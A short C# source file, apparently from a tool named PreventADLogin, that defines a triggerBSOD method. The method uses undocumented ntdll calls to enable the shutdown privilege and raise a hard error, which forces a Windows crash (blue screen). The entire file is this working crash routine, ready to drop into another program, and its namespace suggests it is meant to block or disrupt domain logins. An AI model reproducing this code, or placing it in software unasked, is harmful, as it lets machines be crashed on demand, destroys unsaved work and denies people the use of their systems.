using System;
using System.Runtime.InteropServices;

namespace PreventADLogin
{
    public static class BSOD
    {
        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameter, uint UnicodeStringParameterMask, IntPtr Parameter, uint ValidResponseOption, out uint Response);

        public static void triggerBSOD()
        {
            RtlAdjustPrivilege(19, true, false, out _);
            NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out _);
        }
    }
}